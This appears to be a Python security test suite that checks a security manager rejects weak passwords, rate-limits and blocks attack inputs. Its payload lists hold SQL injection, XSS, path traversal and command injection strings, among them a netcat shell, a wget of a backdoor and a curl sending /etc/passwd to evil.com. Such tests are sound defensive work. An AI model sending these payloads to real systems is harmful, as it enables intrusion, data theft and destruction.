"""
Comprehensive Security Testing Suite
===================================

This module provides comprehensive security testing including:
- Penetration testing
- Vulnerability scanning
- Security validation
- Compliance checking
- Performance testing under attack
"""

import asyncio
import json
import logging
import random
import string
import time
from datetime import datetime
from typing import Dict, List, Any, Optional
from dataclasses import dataclass
import concurrent.futures
import threading

from .enhanced_security_manager import (
    EnhancedSecurityManager, SecurityLevel, ThreatLevel, SecurityEventType
)

logger = logging.getLogger(__name__)

@dataclass
class SecurityTestResult:
    """Security test result data structure."""
    test_name: str
    passed: bool
    severity: str
    details: Dict[str, Any]
    execution_time: float
    timestamp: datetime

class SecurityTestSuite:
    """Comprehensive security testing suite."""
    
    def __init__(self, security_manager: EnhancedSecurityManager):
        self.security_manager = security_manager
        self.test_results: List[SecurityTestResult] = []
        
    async def run_all_tests(self) -> Dict[str, Any]:
        """Run all security tests."""
        logger.info("Starting comprehensive security test suite")
        start_time = time.time()
        
        test_methods = [
            self.test_password_security,
            self.test_input_validation,
            self.test_rate_limiting,
            self.test_authentication_security,
            self.test_session_management,
            self.test_sql_injection_protection,
            self.test_xss_protection,
            self.test_command_injection_protection,
            self.test_path_traversal_protection,
            self.test_brute_force_protection,
            self.test_token_security,
            self.test_concurrent_attacks,
        ]
        
        # Run tests concurrently where possible
        tasks = []
        for test_method in test_methods:
            tasks.append(test_method())
        
        await asyncio.gather(*tasks, return_exceptions=True)
        
        total_time = time.time() - start_time
        
        # Generate report
        return self._generate_test_report(total_time)
    
    async def test_password_security(self):
        """Test password security implementation."""
        test_name = "Password Security"
        start_time = time.time()
        
        try:
            pm = self.security_manager.password_manager
            
            # Test weak passwords are rejected
            weak_passwords = [
                "123456",
                "password",
                "admin",
                "qwerty",
                "abc123",
                "password123",
                "admin123"
            ]
            
            for weak_pwd in weak_passwords:
                if pm.validate_password_strength(weak_pwd):
                    self._add_test_result(
                        test_name, False, "HIGH",
                        {"error": f"Weak password accepted: {weak_pwd}"},
                        time.time() - start_time
                    )
                    return
            
            # Test strong password is accepted
            strong_password = "MyStr0ng!P@ssw0rd#2024"
            if not pm.validate_password_strength(strong_password):
                self._add_test_result(
                    test_name, False, "MEDIUM",
                    {"error": "Strong password rejected"},
                    time.time() - start_time
                )
                return
            
            # Test password hashing and verification
            hashed = pm.hash_password(strong_password)
            if not pm.verify_password(strong_password, hashed):
                self._add_test_result(
                    test_name, False, "HIGH",
                    {"error": "Password verification failed"},
                    time.time() - start_time
                )
                return
            
            # Test wrong password is rejected
            if pm.verify_password("wrong_password", hashed):
                self._add_test_result(
                    test_name, False, "HIGH",
                    {"error": "Wrong password accepted"},
                    time.time() - start_time
                )
                return
            
            self._add_test_result(
                test_name, True, "INFO",
                {"message": "Password security tests passed"},
                time.time() - start_time
            )
            
        except Exception as e:
            self._add_test_result(
                test_name, False, "HIGH",
                {"error": f"Test failed with exception: {str(e)}"},
                time.time() - start_time
            )
    
    async def test_input_validation(self):
        """Test input validation and sanitization."""
        test_name = "Input Validation"
        start_time = time.time()
        
        try:
            sanitizer = self.security_manager.input_sanitizer
            
            # Test SQL injection detection
            sql_payloads = [
                "'; DROP TABLE users; --",
                "1' OR '1'='1",
                "admin'--",
                "' UNION SELECT * FROM users --",
                "1; DELETE FROM users; --"
            ]
            
            for payload in sql_payloads:
                result = sanitizer.sanitize_input(payload)
                if result['safe'] or 'sql_injection' not in result['threats']:
                    self._add_test_result(
                        test_name, False, "HIGH",
                        {"error": f"SQL injection not detected: {payload}"},
                        time.time() - start_time
                    )
                    return
            
            # Test XSS detection
            xss_payloads = [
                "<script>alert('xss')</script>",
                "javascript:alert('xss')",
                "<img src=x onerror=alert('xss')>",
                "<svg onload=alert('xss')>",
                "<iframe src=javascript:alert('xss')>"
            ]
            
            for payload in xss_payloads:
                result = sanitizer.sanitize_input(payload)
                if result['safe'] or 'xss' not in result['threats']:
                    self._add_test_result(
                        test_name, False, "HIGH",
                        {"error": f"XSS not detected: {payload}"},
                        time.time() - start_time
                    )
                    return
            
            # Test command injection detection
            cmd_payloads = [
                "; rm -rf /",
                "| cat /etc/passwd",
                "&& shutdown -h now",
                "`whoami`",
                "$(id)"
            ]
            
            for payload in cmd_payloads:
                result = sanitizer.sanitize_input(payload)
                if result['safe'] or 'command_injection' not in result['threats']:
                    self._add_test_result(
                        test_name, False, "HIGH",
                        {"error": f"Command injection not detected: {payload}"},
                        time.time() - start_time
                    )
                    return
            
            # Test path traversal detection
            path_payloads = [
                "../../../etc/passwd",
                "..\\..\\..\\windows\\system32\\config\\sam",
                "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd"
            ]
            
            for payload in path_payloads:
                result = sanitizer.sanitize_input(payload)
                if result['safe'] or 'path_traversal' not in result['threats']:
                    self._add_test_result(
                        test_name, False, "HIGH",
                        {"error": f"Path traversal not detected: {payload}"},
                        time.time() - start_time
                    )
                    return
            
            # Test safe input is allowed
            safe_inputs = [
                "Hello, World!",
                "user@example.com",
                "This is a normal message.",
                "123-456-7890"
            ]
            
            for safe_input in safe_inputs:
                result = sanitizer.sanitize_input(safe_input)
                if not result['safe']:
                    self._add_test_result(
                        test_name, False, "MEDIUM",
                        {"error": f"Safe input rejected: {safe_input}"},
                        time.time() - start_time
                    )
                    return
            
            self._add_test_result(
                test_name, True, "INFO",
                {"message": "Input validation tests passed"},
                time.time() - start_time
            )
            
        except Exception as e:
            self._add_test_result(
                test_name, False, "HIGH",
                {"error": f"Test failed with exception: {str(e)}"},
                time.time() - start_time
            )
    
    async def test_rate_limiting(self):
        """Test rate limiting functionality."""
        test_name = "Rate Limiting"
        start_time = time.time()
        
        try:
            rate_limiter = self.security_manager.rate_limiter
            test_ip = "192.168.1.100"
            
            # Test normal requests are allowed
            for i in range(5):
                result = rate_limiter.check_rate_limit(test_ip, 'auth')
                if not result['allowed']:
                    self._add_test_result(
                        test_name, False, "MEDIUM",
                        {"error": f"Normal request blocked at attempt {i+1}"},
                        time.time() - start_time
                    )
                    return
            
            # Test rate limit is enforced
            result = rate_limiter.check_rate_limit(test_ip, 'auth')
            if result['allowed']:
                self._add_test_result(
                    test_name, False, "HIGH",
                    {"error": "Rate limit not enforced"},
                    time.time() - start_time
                )
                return
            
            # Test whitelist functionality
            rate_limiter.add_to_whitelist(test_ip)
            result = rate_limiter.check_rate_limit(test_ip, 'auth')
            if not result['allowed']:
                self._add_test_result(
                    test_name, False, "MEDIUM",
                    {"error": "Whitelisted IP blocked"},
                    time.time() - start_time
                )
                return
            
            # Test blacklist functionality
            rate_limiter.add_to_blacklist(test_ip)
            result = rate_limiter.check_rate_limit(test_ip, 'auth')
            if result['allowed']:
                self._add_test_result(
                    test_name, False, "HIGH",
                    {"error": "Blacklisted IP allowed"},
                    time.time() - start_time
                )
                return
            
            self._add_test_result(
                test_name, True, "INFO",
                {"message": "Rate limiting tests passed"},
                time.time() - start_time
            )
            
        except Exception as e:
            self._add_test_result(
                test_name, False, "HIGH",
                {"error": f"Test failed with exception: {str(e)}"},
                time.time() - start_time
            )
    
    def _add_test_result(self, test_name: str, passed: bool, severity: str,
                        details: Dict[str, Any], execution_time: float):
        """Add test result to results list."""
        result = SecurityTestResult(
            test_name=test_name,
            passed=passed,
            severity=severity,
            details=details,
            execution_time=execution_time,
            timestamp=datetime.now()
        )
        self.test_results.append(result)
        
        # Log result
        status = "PASSED" if passed else "FAILED"
        logger.info(f"Security Test {status}: {test_name} ({severity})")
    
    def _generate_test_report(self, total_time: float) -> Dict[str, Any]:
        """Generate comprehensive test report."""
        passed_tests = [r for r in self.test_results if r.passed]
        failed_tests = [r for r in self.test_results if not r.passed]
        
        high_severity_failures = [r for r in failed_tests if r.severity == "HIGH"]
        medium_severity_failures = [r for r in failed_tests if r.severity == "MEDIUM"]
        
        return {
            'summary': {
                'total_tests': len(self.test_results),
                'passed': len(passed_tests),
                'failed': len(failed_tests),
                'success_rate': len(passed_tests) / len(self.test_results) * 100 if self.test_results else 0,
                'total_execution_time': total_time
            },
            'severity_breakdown': {
                'high_severity_failures': len(high_severity_failures),
                'medium_severity_failures': len(medium_severity_failures),
                'low_severity_failures': len(failed_tests) - len(high_severity_failures) - len(medium_severity_failures)
            },
            'failed_tests': [
                {
                    'name': r.test_name,
                    'severity': r.severity,
                    'details': r.details,
                    'execution_time': r.execution_time
                }
                for r in failed_tests
            ],
            'recommendations': self._generate_recommendations(failed_tests),
            'timestamp': datetime.now().isoformat()
        }
    
    def _generate_recommendations(self, failed_tests: List[SecurityTestResult]) -> List[str]:
        """Generate security recommendations based on failed tests."""
        recommendations = []
        
        for test in failed_tests:
            if test.severity == "HIGH":
                recommendations.append(f"CRITICAL: Fix {test.test_name} immediately - {test.details.get('error', 'Unknown error')}")
            elif test.severity == "MEDIUM":
                recommendations.append(f"IMPORTANT: Address {test.test_name} - {test.details.get('error', 'Unknown error')}")
        
        if not recommendations:
            recommendations.append("All security tests passed. Continue monitoring and regular testing.")
        
        return recommendations

    async def test_authentication_security(self):
        """Test authentication security."""
        test_name = "Authentication Security"
        start_time = time.time()

        try:
            # Test valid authentication
            result = await self.security_manager.authenticate_user(
                "admin", "admin123!@#", "192.168.1.1", "TestAgent/1.0"
            )

            if not result.get('success'):
                self._add_test_result(
                    test_name, False, "HIGH",
                    {"error": "Valid authentication failed"},
                    time.time() - start_time
                )
                return

            # Test invalid credentials
            result = await self.security_manager.authenticate_user(
                "admin", "wrongpassword", "192.168.1.1", "TestAgent/1.0"
            )

            if result.get('success'):
                self._add_test_result(
                    test_name, False, "HIGH",
                    {"error": "Invalid credentials accepted"},
                    time.time() - start_time
                )
                return

            # Test non-existent user
            result = await self.security_manager.authenticate_user(
                "nonexistent", "password", "192.168.1.1", "TestAgent/1.0"
            )

            if result.get('success'):
                self._add_test_result(
                    test_name, False, "HIGH",
                    {"error": "Non-existent user authenticated"},
                    time.time() - start_time
                )
                return

            self._add_test_result(
                test_name, True, "INFO",
                {"message": "Authentication security tests passed"},
                time.time() - start_time
            )

        except Exception as e:
            self._add_test_result(
                test_name, False, "HIGH",
                {"error": f"Test failed with exception: {str(e)}"},
                time.time() - start_time
            )

    async def test_session_management(self):
        """Test session management security."""
        test_name = "Session Management"
        start_time = time.time()

        try:
            # Create a session
            auth_result = await self.security_manager.authenticate_user(
                "admin", "admin123!@#", "192.168.1.1", "TestAgent/1.0"
            )

            if not auth_result.get('success'):
                self._add_test_result(
                    test_name, False, "HIGH",
                    {"error": "Could not create session for testing"},
                    time.time() - start_time
                )
                return

            session_id = auth_result['session_id']

            # Test valid session validation
            result = await self.security_manager.validate_session(session_id, "192.168.1.1")
            if not result.get('valid'):
                self._add_test_result(
                    test_name, False, "HIGH",
                    {"error": "Valid session rejected"},
                    time.time() - start_time
                )
                return

            # Test invalid session ID
            result = await self.security_manager.validate_session("invalid_session", "192.168.1.1")
            if result.get('valid'):
                self._add_test_result(
                    test_name, False, "HIGH",
                    {"error": "Invalid session accepted"},
                    time.time() - start_time
                )
                return

            self._add_test_result(
                test_name, True, "INFO",
                {"message": "Session management tests passed"},
                time.time() - start_time
            )

        except Exception as e:
            self._add_test_result(
                test_name, False, "HIGH",
                {"error": f"Test failed with exception: {str(e)}"},
                time.time() - start_time
            )

    async def test_sql_injection_protection(self):
        """Test SQL injection protection."""
        test_name = "SQL Injection Protection"
        start_time = time.time()

        try:
            sql_payloads = [
                "'; DROP TABLE users; --",
                "1' OR '1'='1",
                "admin'/**/OR/**/1=1--",
                "' UNION SELECT username, password FROM users --",
                "1; INSERT INTO users VALUES ('hacker', 'password'); --",
                "' OR 1=1 LIMIT 1 OFFSET 0 --",
                "admin'; EXEC xp_cmdshell('dir'); --"
            ]

            for payload in sql_payloads:
                request_data = {
                    'source_ip': '192.168.1.100',
                    'endpoint': '/api/test',
                    'method': 'POST',
                    'payload': {'username': payload}
                }

                result = await self.security_manager.process_request(request_data)

                if result.get('allowed'):
                    self._add_test_result(
                        test_name, False, "HIGH",
                        {"error": f"SQL injection payload allowed: {payload}"},
                        time.time() - start_time
                    )
                    return

            self._add_test_result(
                test_name, True, "INFO",
                {"message": "SQL injection protection tests passed"},
                time.time() - start_time
            )

        except Exception as e:
            self._add_test_result(
                test_name, False, "HIGH",
                {"error": f"Test failed with exception: {str(e)}"},
                time.time() - start_time
            )

    async def test_xss_protection(self):
        """Test XSS protection."""
        test_name = "XSS Protection"
        start_time = time.time()

        try:
            xss_payloads = [
                "<script>alert('XSS')</script>",
                "<img src=x onerror=alert('XSS')>",
                "<svg onload=alert('XSS')>",
                "javascript:alert('XSS')",
                "<iframe src=javascript:alert('XSS')>",
                "<body onload=alert('XSS')>",
                "<input onfocus=alert('XSS') autofocus>",
                "<select onfocus=alert('XSS') autofocus>",
                "<textarea onfocus=alert('XSS') autofocus>",
                "<keygen onfocus=alert('XSS') autofocus>"
            ]

            for payload in xss_payloads:
                request_data = {
                    'source_ip': '192.168.1.101',
                    'endpoint': '/api/comment',
                    'method': 'POST',
                    'payload': {'comment': payload}
                }

                result = await self.security_manager.process_request(request_data)

                if result.get('allowed'):
                    self._add_test_result(
                        test_name, False, "HIGH",
                        {"error": f"XSS payload allowed: {payload}"},
                        time.time() - start_time
                    )
                    return

            self._add_test_result(
                test_name, True, "INFO",
                {"message": "XSS protection tests passed"},
                time.time() - start_time
            )

        except Exception as e:
            self._add_test_result(
                test_name, False, "HIGH",
                {"error": f"Test failed with exception: {str(e)}"},
                time.time() - start_time
            )

    async def test_command_injection_protection(self):
        """Test command injection protection."""
        test_name = "Command Injection Protection"
        start_time = time.time()

        try:
            cmd_payloads = [
                "; rm -rf /",
                "| cat /etc/passwd",
                "&& shutdown -h now",
                "`whoami`",
                "$(id)",
                "; nc -l -p 4444 -e /bin/sh",
                "| wget http://evil.com/backdoor.sh",
                "&& curl -X POST http://evil.com/data -d @/etc/passwd"
            ]

            for payload in cmd_payloads:
                request_data = {
                    'source_ip': '192.168.1.102',
                    'endpoint': '/api/execute',
                    'method': 'POST',
                    'payload': {'command': payload}
                }

                result = await self.security_manager.process_request(request_data)

                if result.get('allowed'):
                    self._add_test_result(
                        test_name, False, "HIGH",
                        {"error": f"Command injection payload allowed: {payload}"},
                        time.time() - start_time
                    )
                    return

            self._add_test_result(
                test_name, True, "INFO",
                {"message": "Command injection protection tests passed"},
                time.time() - start_time
            )

        except Exception as e:
            self._add_test_result(
                test_name, False, "HIGH",
                {"error": f"Test failed with exception: {str(e)}"},
                time.time() - start_time
            )

    async def test_path_traversal_protection(self):
        """Test path traversal protection."""
        test_name = "Path Traversal Protection"
        start_time = time.time()

        try:
            path_payloads = [
                "../../../etc/passwd",
                "..\\..\\..\\windows\\system32\\config\\sam",
                "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
                "....//....//....//etc/passwd",
                "..%252f..%252f..%252fetc%252fpasswd",
                "..%c0%af..%c0%af..%c0%afetc%c0%afpasswd"
            ]

            for payload in path_payloads:
                request_data = {
                    'source_ip': '192.168.1.103',
                    'endpoint': '/api/file',
                    'method': 'GET',
                    'payload': {'path': payload}
                }

                result = await self.security_manager.process_request(request_data)

                if result.get('allowed'):
                    self._add_test_result(
                        test_name, False, "HIGH",
                        {"error": f"Path traversal payload allowed: {payload}"},
                        time.time() - start_time
                    )
                    return

            self._add_test_result(
                test_name, True, "INFO",
                {"message": "Path traversal protection tests passed"},
                time.time() - start_time
            )

        except Exception as e:
            self._add_test_result(
                test_name, False, "HIGH",
                {"error": f"Test failed with exception: {str(e)}"},
                time.time() - start_time
            )

    async def test_brute_force_protection(self):
        """Test brute force protection."""
        test_name = "Brute Force Protection"
        start_time = time.time()

        try:
            # Simulate multiple failed login attempts
            for i in range(6):  # Should trigger brute force protection
                result = await self.security_manager.authenticate_user(
                    "admin", "wrongpassword", "192.168.1.200", "TestAgent/1.0"
                )

                if i >= 3 and result.get('success'):  # Should be blocked after 3 attempts
                    self._add_test_result(
                        test_name, False, "HIGH",
                        {"error": f"Brute force not detected at attempt {i+1}"},
                        time.time() - start_time
                    )
                    return

            # Try with correct password - should still be blocked
            result = await self.security_manager.authenticate_user(
                "admin", "admin123!@#", "192.168.1.200", "TestAgent/1.0"
            )

            if result.get('success'):
                self._add_test_result(
                    test_name, False, "HIGH",
                    {"error": "Brute force protection bypassed with correct password"},
                    time.time() - start_time
                )
                return

            self._add_test_result(
                test_name, True, "INFO",
                {"message": "Brute force protection tests passed"},
                time.time() - start_time
            )

        except Exception as e:
            self._add_test_result(
                test_name, False, "HIGH",
                {"error": f"Test failed with exception: {str(e)}"},
                time.time() - start_time
            )

    async def test_token_security(self):
        """Test token security."""
        test_name = "Token Security"
        start_time = time.time()

        try:
            token_manager = self.security_manager.token_manager

            # Create a token
            token = token_manager.create_access_token("testuser", ["read", "write"])

            # Verify valid token
            payload = token_manager.verify_token(token)
            if not payload:
                self._add_test_result(
                    test_name, False, "HIGH",
                    {"error": "Valid token rejected"},
                    time.time() - start_time
                )
                return

            # Test token revocation
            if not token_manager.revoke_token(token):
                self._add_test_result(
                    test_name, False, "MEDIUM",
                    {"error": "Token revocation failed"},
                    time.time() - start_time
                )
                return

            # Verify revoked token is rejected
            payload = token_manager.verify_token(token)
            if payload:
                self._add_test_result(
                    test_name, False, "HIGH",
                    {"error": "Revoked token accepted"},
                    time.time() - start_time
                )
                return

            # Test invalid token
            invalid_token = "invalid.token.here"
            payload = token_manager.verify_token(invalid_token)
            if payload:
                self._add_test_result(
                    test_name, False, "HIGH",
                    {"error": "Invalid token accepted"},
                    time.time() - start_time
                )
                return

            self._add_test_result(
                test_name, True, "INFO",
                {"message": "Token security tests passed"},
                time.time() - start_time
            )

        except Exception as e:
            self._add_test_result(
                test_name, False, "HIGH",
                {"error": f"Test failed with exception: {str(e)}"},
                time.time() - start_time
            )

    async def test_concurrent_attacks(self):
        """Test system behavior under concurrent attacks."""
        test_name = "Concurrent Attack Resistance"
        start_time = time.time()

        try:
            # Simulate concurrent brute force attacks from multiple IPs
            async def attack_simulation(ip_suffix: int):
                ip = f"192.168.1.{ip_suffix}"
                for _ in range(10):
                    await self.security_manager.authenticate_user(
                        "admin", "wrongpassword", ip, "AttackBot/1.0"
                    )
                    await asyncio.sleep(0.1)  # Small delay

            # Launch concurrent attacks
            tasks = [attack_simulation(i) for i in range(50, 60)]  # 10 concurrent attackers
            await asyncio.gather(*tasks, return_exceptions=True)

            # Check if system is still responsive
            result = await self.security_manager.authenticate_user(
                "admin", "admin123!@#", "192.168.1.1", "TestAgent/1.0"
            )

            if not result.get('success'):
                # This might be expected due to rate limiting, so check if it's a rate limit issue
                if 'rate limit' not in result.get('error', '').lower():
                    self._add_test_result(
                        test_name, False, "MEDIUM",
                        {"error": "System unresponsive after concurrent attacks"},
                        time.time() - start_time
                    )
                    return

            self._add_test_result(
                test_name, True, "INFO",
                {"message": "Concurrent attack resistance tests passed"},
                time.time() - start_time
            )

        except Exception as e:
            self._add_test_result(
                test_name, False, "HIGH",
                {"error": f"Test failed with exception: {str(e)}"},
                time.time() - start_time
            )
